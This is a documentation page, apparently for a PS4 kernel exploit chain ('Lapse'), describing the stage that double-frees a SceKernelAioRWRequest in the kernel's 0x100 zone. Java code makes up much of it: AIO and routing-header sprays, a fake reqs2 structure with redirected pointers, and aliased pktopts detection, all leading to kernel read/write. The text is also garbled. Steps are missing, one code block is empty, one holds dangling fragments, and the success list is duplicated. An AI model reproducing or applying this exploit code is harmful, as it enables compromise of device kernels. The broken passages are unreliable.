# Stage 3: reqs1 Double-Free

Stage 3 performs the second double-free, this time targeting a `SceKernelAioRWRequest` structure (reqs1) in the kernel's 0x100 byte zone. This creates controlled memory corruption that will be leveraged to achieve arbitrary kernel read/write in Stage 4.

## Overview

Implemented in `Lapse.executeStage3()` at `Lapse.java:926-1066`.

```java
public static int[] executeStage3(int aliasedSd) {
    Status.println("=== STAGE 3: Double free SceKernelAioRWRequest ===");
    // Alias rthdr with AIO queue, double-free reqs1, reclaim with pktopts
    return sdPair; // [masterSock, reclaimSock] or null
}
```

## Goals of Stage 3

This stage must:

1. **Overwrite rthdr with AIO queue entry** - Achieve type confusion in 0x100 zone
2. **Double-free reqs1** - Corrupt the SceKernelAioRWRequest structure
3. **Reclaim with pktopts** - Allocate IPv6 packet options in freed memory
4. **Return aliased pktopts pair** - Two sockets sharing same memory (for Stage 4)

## Memory Zones

Stage 3 targets the **0x100 byte zone**:

- Stage 1 worked in **0x80 zone** (aio_entry, ip6_rthdr)
- Stage 3 works in **0x100 zone** (SceKernelAioRWRequest, ip6_pktopts)

<Note>
Different zones require different allocation/free patterns. The 0x100 zone is typically less fragmented than 0x80.
</Note>

### Why This Works

The `aliasedSd` socket from Stage 2 points to freed memory. When we spray AIO requests:

1. AIO queue entries are allocated in the **0x100 zone**
2. Some reclaim the memory that `aliasedSd.ip6_rthdr` points to
3. `getRthdr()` reads the AIO queue entry as if it's a routing header
4. AIO queue entries start with the command (AIO_CMD_READ)
5. When we read command at offset 0, we've confirmed the aliasing

<Warning>
If aliasing fails after 8 attempts, memory state is unpredictable. System reboot recommended.
</Warning>

## Step 2: Overwrite AIO Entry with rthdr

### Crafting Fake reqs2

Now we reverse the confusion: overwrite the AIO queue entry with routing header data.

From `Lapse.java:965-974`:


### Critical Fields

```
Fake reqs2 (aio_entry) structure:
+0x00: routing header metadata (from buildRoutingHeader)
+0x04: ar2_ticket = 5 (arbitrary valid ticket)
+0x18: ar2_info = reqs1Addr (leaked in Stage 2)
+0x20: ar2_batch = fakeReqs3Addr (our fake batch from Stage 2)
```

These pointers redirect kernel operations:
- When kernel processes this "AIO", it follows `ar2_info` to reqs1
- It follows `ar2_batch` to our controlled fake batch structure

```java
private static int overwriteAioEntryWithRthdr(int[] sds, Buffer reqs2, int rsize,
    long[] addrCache, int numElems, Buffer states, long aioIdsBase) {

    for (int i = 1; i <= NUM_ALIAS; i++) {  // NUM_ALIAS = 100

        // Spray routing headers with our fake reqs2
        int rthdrsSet = 0;
        for (int j = 0; j < NUM_SDS && j < sds.length; j++) {
            if (sds[j] >= 0) {
                Helper.setRthdr(sds[j], reqs2, rsize);
                rthdrsSet++;
            }
        }

        // Check each AIO batch for corruption
        for (int batch = 1; batch <= addrCache.length; batch++) {
            int batchJava = batch - 1;

            try {
                for (int j = 0; j < numElems; j++) {
                    states.putInt(j * 4, -1);
                }

                // Cancel AIOs - corrupted one will return AIO_STATE_COMPLETE
                Helper.aioMultiCancel(addrCache[batchJava], numElems, 
                                    states.address());

                int reqIdx = -1;
                for (int j = 0; j < numElems; j++) {
                    int val = states.getInt(j * 4);
                    if (val == Helper.AIO_STATE_COMPLETE) {
                        reqIdx = j;
                        break;
                    }
                }

                if (reqIdx != -1) {
                    Status.println("states[" + reqIdx + "] = " + 
                                  Integer.toHexString(states.getInt(reqIdx * 4)));
                    Status.println("found req_id at batch: " + batch);
                    Status.println("aliased at attempt: " + i);

                    int aioIdx = (batch - 1) * numElems + reqIdx;
                    long reqIdP = aioIdsBase + aioIdx * 4;
                    
                    int reqId = api.read32(reqIdP);
                    
                    Status.println("req_id = " + Integer.toHexString(reqId));

                    return reqId;
                }
                
            } catch (Exception e) {
                Status.println("Error processing batch " + batch + ": " + 
                              e.getMessage());
            }
        }
    }

    return -1;
}
```

<Note>
When an AIO queue entry is overwritten with our fake reqs2, canceling it returns AIO_STATE_COMPLETE (because we set ar2_batch to point to a batch with state=COMPLETE). This is how we detect successful corruption.
</Note>

```java
targetIds.putInt(4, targetId);   // Original AIO (points to reqs1)

              Integer.toHexString(reqId) + ", target_id=" + 
              Integer.toHexString(targetId));

Status.println("Double-free executed");
```

### Why This is a Double-Free

```
Before Delete:
reqId    → Corrupted AIO entry → ar2_info = reqs1Addr
targetId → Original AIO entry  → ar1_reqs2 = reqs1Addr

Both point to the same reqs1 structure!

After aioMultiDelete():
1. Delete reqId → follows ar2_info → frees reqs1
2. Delete targetId → follows ar1_reqs2 → frees reqs1 AGAIN

Result: reqs1 is freed twice (double-free)
```

<Note>
Both `reqId` and `targetId` ultimately reference the same `reqs1` structure through different paths. Deleting both causes reqs1 to be freed twice.
</Note>

### makeAliasedPktopts Implementation

From `Lapse.java:548-615`:

```java
public static int[] makeAliasedPktopts(int[] sds) {
    Buffer tclass = new Buffer(4);

    for (int loop = 1; loop <= NUM_ALIAS; loop++) {  // NUM_ALIAS = 100
        
        // Write unique markers to each socket's pktopts
        for (int i = 1; i <= sds.length; i++) {
            if (sds[i-1] >= 0) {
                tclass.putInt(0, i);  // Unique marker
                Helper.setSockOpt(sds[i-1], Helper.IPPROTO_IPV6, 
                                Helper.IPV6_TCLASS, tclass, 4);
            }
        }
        
        // Read back markers to detect aliasing
        for (int i = 1; i <= sds.length; i++) {
            if (sds[i-1] >= 0) {
                Helper.getSockOpt(sds[i-1], Helper.IPPROTO_IPV6, 
                                Helper.IPV6_TCLASS, tclass, 4);
                int marker = tclass.getInt(0);
                
                // If marker changed, sockets are aliased!
                if (marker != i && marker > 0 && marker <= sds.length) {
                    int aliasedIdx = marker - 1;
                    if (aliasedIdx >= 0 && aliasedIdx < sds.length && 
                        sds[aliasedIdx] >= 0) {
                        
                        Status.println("Aliased pktopts at attempt: " + loop + 
                                      " (found pair: " + sds[i-1] + " " + 
                                      sds[aliasedIdx] + ")");

                        int[] sdPair = new int[2];
                        sdPair[0] = sds[i-1];
                        sdPair[1] = sds[aliasedIdx];
                        
                        // Remove aliased sockets from array
                        Helper.removeSocketFromArray(sds, Math.max(i-1, aliasedIdx));
                        Helper.removeSocketFromArray(sds, Math.min(i-1, aliasedIdx));
                        
                        // Create new pktopts on replacement sockets
                        for (int j = 0; j < 2; j++) {
                            int sockFd = Helper.createUdpSocket();
                            Helper.setSockOpt(sockFd, Helper.IPPROTO_IPV6, 
                                            Helper.IPV6_TCLASS, tclass, 4);
                            Helper.addSocketToArray(sds, sockFd);
                        }
                        return sdPair;
                    }
                }
            }
        }

        // Free pktopts and retry
        for (int i = 0; i < sds.length; i++) {
            if (sds[i] >= 0) {
                Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, 
                                Helper.IPV6_2292PKTOPTIONS, new Buffer(1), 0);
            }
        }
    }

    return null;
}
```

### Aliasing Detection

Same principle as Stage 1's `makeAliasedRthdrs()`:

1. Write unique marker to each socket's IPV6_TCLASS field
2. Read back from all sockets
3. If socket A reads a marker that belongs to socket B → they're aliased
4. Aliased sockets share the same `ip6_pktopts` structure in kernel memory

<Note>
IPV6_TCLASS is stored in the pktopts structure at offset PS4_OFF_TCLASS. Writing/reading it through different sockets that share memory proves aliasing.
</Note>

### Success Conditions

✅ Stage 3 succeeds when:
1. **states[0] == SCE_KERNEL_ERROR_ESRCH (0x80020003)** - Corrupted AIO no longer exists
2. **err1 == err2 == 0** - Both deletes succeeded

✅ Stage 3 succeeds when:

5. Verification checks pass (states[0] == 0x80020003)

## Common Failure Points

### Failed to Overwrite rthdr

```
Failed to overwrite rthdr
```

**Cause**: AIO spray not reclaiming aliased socket's memory  
**Solution**: Increase NUM_CLOBBERS or system reboot

### Failed to Overwrite AIO Entry

```
Failed to overwrite AIO queue entry
```

**Cause**: Routing header spray not reclaiming closed AIO memory  
**Solution**: Increase NUM_ALIAS or ensure proper free/alloc timing

### Failed to Make Aliased Pktopts

```
Failed to make aliased pktopts despite successful double-free
```

**Cause**: Memory reclaimed by something other than our sockets  
**Solution**: Increase NUM_SDS_ALT (currently 48), or retry

### Bad Delete of Corrupt AIO

```
Error: bad delete of corrupt AIO request
```

**Cause**: states[0] != 0x80020003, corruption not as expected  
**Solution**: System instability, reboot required
